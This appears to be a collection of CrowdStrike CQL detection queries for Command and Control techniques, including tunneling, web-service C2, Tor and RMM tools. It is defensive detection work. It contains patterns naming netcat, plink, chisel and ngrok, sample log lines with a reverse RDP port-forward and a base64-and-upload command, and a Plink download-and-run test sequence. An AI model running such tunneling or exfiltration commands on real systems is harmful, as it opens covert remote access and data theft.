> source:: CQL Hub
> cql_hub_file:: windows_store_installs.yml
> cql_hub_name:: Windows Store Installs
> cql_hub_author:: Craig Roberts
> related_mitre_ids:: T1090
> cql_hub_tags:: Monitoring
> tags:: CQL, MITRE/Command_and_Control, CQL_Hub

* Detection Objective: This query displays all applications installed from the Microsoft Store on a machine. It extracts the package name from the file path and groups the results by computer name and package base. Also features the ability to filter out known good file paths and packages to reduce noise in the results.

* Telemetry Requirements: Endpoint
* Source: CQL Hub (`windows_store_installs.yml`), author: Craig Roberts.

#### Production-Ready CQL Query:

```cql
| regex("WindowsApps\\\\(?<PackageName>[^\\\\]+)\\\\", field=FilePath, strict=true)
| regex("^(?<PackageBase>[^_]+)", field=PackageName, strict=false)
| ComputerName=~wildcard(?ComputerName, ignoreCase=true)
| PackageBase=~wildcard(?PackageBase, ignoreCase=true)
// Filter out good filepaths
//| !in(field=FilePath, values=[])
// Filter out good Packages
//| !in(field=PackageBase, values=[])
| groupBy([ComputerName, PackageBase])
| sort(ComputerName, order=asc, limit=max)

```

#### Analytical Breakdown & Field Mappings:
* CQL Hub Explanation: Takes the filepath and pulls out those files loaded into the \Program Files\WindowsApps directory. Then performs a regex to grab just the package name as it should appear if you did a 'Get-AppxPackage on the machine. Outputs a report using computername and PackageBase
* Key Indicators: Review query output fields and filters from `windows_store_installs.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1572]] - Protocol Tunneling

> [!metadata]+ Detection Metadata
> tactic:: Command and Control
> technique_id:: T1572
> technique_name:: Protocol Tunneling
> logscale_stream:: NetworkConnectIP4
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Medium
> tags:: CQL, MITRE/Command_and_Control

* Detection Objective: Detect repeated external connections from tunneling-capable binaries or LOLBAS processes to uncommon ports.
* Telemetry Requirements: NetworkConnectIP4, ProcessRollup2

#### Production-Ready CQL Query:

```cql
// Title: Protocol Tunneling Connection Pattern
// Focus: Tunnel tooling or system binaries with repeated external non-standard connections
#event_simpleName=NetworkConnectIP4
| ImageFileName=/\\(ssh|plink|chisel|ngrok|frpc|stunnel|powershell|rundll32|svchost)\.exe$/i
| NOT cidr(RemoteAddressIP4, subnet=["10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16", "127.0.0.0/8"])
| groupBy([aid, ComputerName, ImageFileName, ContextProcessId, RemoteAddressIP4, RemotePort], function=[count(as=connection_count)])
| connection_count >= 5
| sort(connection_count, order=desc)
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Tunnel-capable process and repeated external connections.
* Triage Steps: Map ContextProcessId to command line; inspect local listeners and firewall changes.
* Potential False Positives: SSH tunnels by administrators and developers.
#### Lab Validation (Expected True Positive Signature):
* Expected Log Profile:
```json
{"#event_simpleName":"NetworkConnectIP4","ImageFileName":"\\Device\\HarddiskVolume3\\Users\\Public\\ngrok.exe","RemoteAddressIP4":"203.0.113.44","RemotePort":443}
```

---

### [[T1572]] - Protocol Tunneling — CQL Hub: Remote Port Forwarding via Plink - Unauthorized RDP Tunneling Detection

> [!metadata]+ Detection Metadata
> tactic:: Command and Control
> technique_id:: T1572
> technique_name:: Protocol Tunneling
> logscale_stream:: Endpoint
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: remote_port_forwarding_via_plink_unauthorized_rdp_tunneling_detection.yml
> cql_hub_name:: Remote Port Forwarding via Plink - Unauthorized RDP Tunneling Detection
> cql_hub_author:: cap10
> cql_hub_mitre_ids:: T1572, T1021.004
> related_mitre_ids:: T1572, T1021.004
> required_modules:: Insight
> cql_hub_tags:: Hunting
> tags:: CQL, MITRE/Command_and_Control, CQL_Hub

* Detection Objective: Detects the use of Plink (PuTTY Link) to establish remote port forwarding tunnels, specifically targeting traffic redirected to port 3389 (RDP). This technique is frequently used by threat actors for lateral movement or to bypass firewall restrictions by tunneling RDP over SSH.

* Telemetry Requirements: Endpoint
* Source: CQL Hub (`remote_port_forwarding_via_plink_unauthorized_rdp_tunneling_detection.yml`), author: cap10.
* Original CQL Hub MITRE IDs: T1572, T1021.004.
* Related/Resolved MITRE IDs: T1572, T1021.004.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Insight. Validate that this telemetry/module exists in the environment before operational use.

```cql
#event_simpleName=ProcessRollup2
| ImageFileName=/\\plink(64)?\.exe$/i
| CommandLine=/\s-(R|L).*:3389/i
| table([aid, ComputerName, UserName, ImageFileName, CommandLine, ParentBaseFileName])
| sort(@timestamp, order=desc)

```

#### Analytical Breakdown & Field Mappings:
* CQL Hub Explanation: Attackers use `plink.exe` the command-line SSH client from PuTTY to create encrypted SSH tunnels that forward RDP traffic (port 3389) through firewall boundaries. This allows an attacker with an existing foothold to RDP into internal systems even when direct RDP is blocked.  ## Forwarding Flags * **-R (Remote Forward):** Attacker binds a port on their server and pulls traffic back to an internal RDP target. * **-L (Local Forward):** Victim machine forwards a local port outbound to an RDP target via the SSH server.  ## Why It's Dangerous Because the tunnel rides over SSH (typically port 22 or 443), it blends with legitimate encrypted traffic and often bypasses firewall and DLP controls. The resulting RDP session appears to originate from inside the network.  ## Testing the Detection You can safely validate this detection on an enrolled endpoint without establishing an actual tunnel. The connection will fail immediately, but the EDR will still capture the `ProcessRollup2` event.  ### 1. Download and Execute (PowerShell) PowerShell example: Invoke-WebRequest -Uri "[https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe](https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe)" -OutFile "$env:TEMP\plink.exe"  # Test -R (remote forward) & "$env:TEMP\plink.exe" -R 4444:localhost:3389 user@192.168.1.1  # Test -L (local forward) & "$env:TEMP\plink.exe" -L 4444:localhost:3389 user@192.168.1.1
* Key Indicators: Review query output fields and filters from `remote_port_forwarding_via_plink_unauthorized_rdp_tunneling_detection.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1102]] - Web Service

> [!metadata]+ Detection Metadata
> tactic:: Command and Control
> technique_id:: T1102
> technique_name:: Web Service
> logscale_stream:: DnsRequest
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Medium
> tags:: CQL, MITRE/Command_and_Control

* Detection Objective: Detect script or LOLBAS processes communicating with paste, gist, discord, telegram, or file-sharing web services commonly abused for C2 or payload staging.
* Telemetry Requirements: DnsRequest, NetworkConnectIP4, ProcessRollup2

#### Production-Ready CQL Query:

```cql
// Title: C2 via Common Web Service Domains
// Focus: Script/LOLBAS process with DNS to abused web service domains
#event_simpleName=DnsRequest
| DomainName=/(pastebin|hastebin|gist\.github|raw\.githubusercontent|discord(app)?\.com|telegram\.org|api\.telegram|dropbox|workers\.dev|pages\.dev|ngrok|trycloudflare)\./i
| groupBy([aid, ComputerName, ContextProcessId], function=[count(as=query_count), collect(DomainName, limit=20)])
| query_count >= 2
| select([ComputerName, aid, ContextProcessId, query_count, DomainName])
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: DNS requests to web services frequently abused for C2 or payload hosting.
* Triage Steps: Resolve process context and check whether domain use is business-approved.
* Potential False Positives: Developers and legitimate SaaS usage; tune by process and domain.
#### Lab Validation (Expected True Positive Signature):
* Expected Log Profile:
```json
{"#event_simpleName":"DnsRequest","DomainName":"raw.githubusercontent.com","ContextProcessId":"4567"}
```

---

### [[T1001]] - Data Obfuscation

> [!metadata]+ Detection Metadata
> tactic:: Command and Control
> technique_id:: T1001
> technique_name:: Data Obfuscation
> logscale_stream:: ProcessRollup2
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Medium
> tags:: CQL, MITRE/Command_and_Control

* Detection Objective: Detect C2 staging commands that encode/compress payloads before network transfer.
* Telemetry Requirements: ProcessRollup2, NetworkConnectIP4

#### Production-Ready CQL Query:

```cql
// Title: Encoded or Compressed Network Payload Preparation
// Focus: base64/gzip/encrypt followed by curl/web request patterns
#event_simpleName=ProcessRollup2
| ImageFileName=/\\(powershell|pwsh|python|certutil|openssl|curl)\.exe$/i
| CommandLine=/(base64|FromBase64String|ToBase64String|gzip|DeflateStream|openssl\s+enc|certutil\s+-encode|--data-binary|Invoke-RestMethod)/i
| CommandLine=/(http|https|--upload-file|POST|Invoke-WebRequest|curl)/i
| select([@timestamp, ComputerName, aid, UserName, ParentBaseFileName, ImageFileName, CommandLine])
| sort(@timestamp, order=desc)
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Encoding/compression plus network transfer semantics.
* Triage Steps: Decode payload where possible and correlate with remote endpoint.
* Potential False Positives: Legitimate API clients and data transfer scripts.
#### Lab Validation (Expected True Positive Signature):
* Expected Log Profile:
```json
{"#event_simpleName":"ProcessRollup2","FileName":"powershell.exe","CommandLine":"[Convert]::ToBase64String($bytes); Invoke-RestMethod https://host/api"}
```

---

### [[T1573]] - Encrypted Channel

> [!metadata]+ Detection Metadata
> tactic:: Command and Control
> technique_id:: T1573
> technique_name:: Encrypted Channel
> logscale_stream:: ProcessRollup2
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Low
> tags:: CQL, MITRE/Command_and_Control

* Detection Objective: Detect userland creation of encrypted tunnels/channels using openssl, stunnel, plink, or SSH from unusual paths.
* Telemetry Requirements: ProcessRollup2, NetworkConnectIP4

#### Production-Ready CQL Query:

```cql
// Title: Userland Encrypted Tunnel Creation
// Focus: openssl/stunnel/ssh/plink encrypted channel setup
#event_simpleName=ProcessRollup2
| ImageFileName=/\\(openssl|stunnel|ssh|plink|putty|powershell|pwsh)\.exe$/i
| CommandLine=/(stunnel|openssl\s+s_client|ssh\s+-N|ssh\s+-D|plink\s+-(R|L|D)|TLS|SSL|certificate|connect\s+)/i
| select([@timestamp, ComputerName, aid, UserName, ParentBaseFileName, ImageFileName, CommandLine])
| sort(@timestamp, order=desc)
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Encrypted tunnel utilities and forwarding/connect switches.
* Triage Steps: Validate admin/developer use; inspect destination and persistence.
* Potential False Positives: Legitimate SSH administration and developer tunneling.
#### Lab Validation (Expected True Positive Signature):
* Expected Log Profile:
```json
{"#event_simpleName":"ProcessRollup2","FileName":"plink.exe","CommandLine":"plink.exe -N -R 8443:localhost:3389 user@host"}
```

---

### [[T1095]] - Non-Application Layer Protocol

> [!metadata]+ Detection Metadata
> tactic:: Command and Control
> technique_id:: T1095
> technique_name:: Non-Application Layer Protocol
> logscale_stream:: NetworkConnectIP4
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Medium
> tags:: CQL, MITRE/Command_and_Control

* Detection Objective: Detect non-browser process communication over raw TCP-like non-standard ports with repeated connection patterns.
* Telemetry Requirements: NetworkConnectIP4, ProcessRollup2

#### Production-Ready CQL Query:

```cql
// Title: Raw or Non-Application Protocol C2
// Focus: nc/ncat/powershell connections to unusual ports
#event_simpleName=NetworkConnectIP4
| ImageFileName=/\\(nc|ncat|netcat|powershell|pwsh|cmd|python|rundll32)\.exe$/i
| NOT in(field=RemotePort, values=[53, 80, 123, 443, 445, 3389, 5985, 5986])
| NOT cidr(RemoteAddressIP4, subnet=["10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16", "127.0.0.0/8"])
| groupBy([aid, ComputerName, ImageFileName, ContextProcessId, RemoteAddressIP4, RemotePort], function=[count(as=connection_count)])
| connection_count >= 3
| select([ComputerName, aid, ImageFileName, ContextProcessId, RemoteAddressIP4, RemotePort, connection_count])
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Raw networking tools or interpreters on uncommon external ports.
* Triage Steps: Resolve process command line and inspect payload/script.
* Potential False Positives: Network diagnostics and developer tools.
#### Lab Validation (Expected True Positive Signature):
* Expected Log Profile:
```json
{"#event_simpleName":"NetworkConnectIP4","ImageFileName":"\\Device\\HarddiskVolume3\\Users\\Public\\ncat.exe","RemoteAddressIP4":"198.51.100.44","RemotePort":4444}
```

---

### [[T1090.003]] - Multi-hop Proxy — CQL Hub: Connections to Tor Exit Nodes

> [!metadata]+ Detection Metadata
> tactic:: Command and Control
> technique_id:: T1090.003
> technique_name:: Multi-hop Proxy
> logscale_stream:: Endpoint
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: connections_to_tor_exit_nodes.yml
> cql_hub_name:: Connections to Tor Exit Nodes
> cql_hub_author:: ByteRay GmbH
> cql_hub_mitre_ids:: T1090.003
> related_mitre_ids:: T1090.003
> required_modules:: Insight
> cql_hub_tags:: Hunting
> tags:: CQL, MITRE/Command_and_Control, CQL_Hub

* Detection Objective: Detects network connections to or from known Tor exit nodes by matching endpoint telemetry against a curated lookup file of Tor exit node IPs.

* Telemetry Requirements: Endpoint
* Source: CQL Hub (`connections_to_tor_exit_nodes.yml`), author: ByteRay GmbH.
* Original CQL Hub MITRE IDs: T1090.003.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Insight; Tor exit-node lookup data; CQL Hub lookup file availability. Validate that this telemetry/module exists in the environment before operational use.

```cql
#event_simpleName=NetworkConnectIP4
| match(file="tor-exit-nodes.csv", field=RemoteAddressIP4, column=ip, strict=true)
| groupBy([aid, ComputerName], function=[count(as=ConnectionCount), count(RemoteAddressIP4, distinct=true, as=UniqueIPs), collect([RemoteAddressIP4, RemotePort], limit=50), min(@timestamp, as=FirstSeen), max(@timestamp, as=LastSeen)], limit=20000)
| FirstSeen := formatTime(format="%Y-%m-%d %H:%M:%S", field=FirstSeen, timezone="UTC")
| LastSeen := formatTime(format="%Y-%m-%d %H:%M:%S", field=LastSeen, timezone="UTC")
| sort(ConnectionCount, order=desc)
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Review query output fields and filters from `connections_to_tor_exit_nodes.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1219.002]] - Remote Desktop Software — CQL Hub: Detect Remote Monitoring and Management (RMM) Tools over DNS

> [!metadata]+ Detection Metadata
> tactic:: Command and Control
> technique_id:: T1219.002
> technique_name:: Remote Desktop Software
> logscale_stream:: Network
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: detect_rmm_dns.yml
> cql_hub_name:: Detect Remote Monitoring and Management (RMM) Tools over DNS
> cql_hub_author:: ByteRay GmbH
> cql_hub_mitre_ids:: T1219.002
> related_mitre_ids:: T1219.002
> required_modules:: Insight
> cql_hub_tags:: Hunting
> tags:: CQL, MITRE/Command_and_Control, CQL_Hub

* Detection Objective: This query identifies the presence or execution of common RMM utilities (e.g., AnyDesk, TeamViewer, ConnectWise, ScreenConnect, Splashtop). While these tools are legitimate and widely used for IT administration, adversaries often abuse them as “living-off-the-land” remote access backdoors. Because they operate under the guise of trusted software and can blend with normal activity, malicious use of RMM tools may bypass traditional security controls, enabling persistence, data exfiltration, or hands-on-keyboard attacks.
* Telemetry Requirements: Network
* Source: CQL Hub (`detect_rmm_dns.yml`), author: ByteRay GmbH.
* Original CQL Hub MITRE IDs: T1219.002.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Insight. Validate that this telemetry/module exists in the environment before operational use.

```cql
#event_simpleName=DnsRequest
| DomainName=/anydesk\.com|action1\.com|beamyourscreen\.com|snapview\.de|rustdesk\.com|fleetdeck\.io|tailscale\.com|dwservice\.net|secure\.logmein\.com|teamviewer\.com|screenconnect\.com|fixme\.it|n-able\.com|domotz\.com|datto\.com|level\.io|itarian\.com|pulseway\.com|zoho\.com|manageengine\.com|bomgarcloud\.com|bomgar\.com|zabbix\.com/i
| groupBy([DomainName],function=[collect(ContextBaseFileName), count(aid,distinct=true,as=HostCount)])
| sort(HostCount,order=asc)

```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Review query output fields and filters from `detect_rmm_dns.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.
